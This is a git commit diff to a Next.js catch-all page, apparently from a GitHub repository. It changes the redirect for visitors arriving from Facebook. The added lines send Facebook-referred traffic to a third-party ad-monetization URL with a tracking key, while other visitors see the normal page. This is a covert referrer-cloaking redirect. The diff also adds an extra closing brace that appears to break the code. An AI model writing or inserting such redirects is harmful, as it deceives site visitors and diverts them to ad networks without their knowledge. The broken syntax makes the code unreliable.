eaea767a0f6fe59baa2cfeee4756bc757e992fd5
Naveed25 <118828550+Naveed25@users.noreply.github.com>
2025-01-30 14:10:42 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -16,11 +16,12 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
   // redirect if facebook is the referer or request contains fbclid
   if (referringURL?.includes("facebook.com") || fbclid) {
     return {
-      redirect: {
-        permanent: false,
-        destination: `${
-          endpoint.replace(/(\/graphql\/)/, "/") + encodeURI(path as string)
-        }`,
+			redirect: {
+				permanent: false,
+				destination: `${
+					`https://www.profitablecpmrate.com/fv2hfdsr?key=8c171eb61da039d51b1dc96752e6b4bc/` + encodeURI(path as string)
+				}`,
+			},
       },
     };
   }
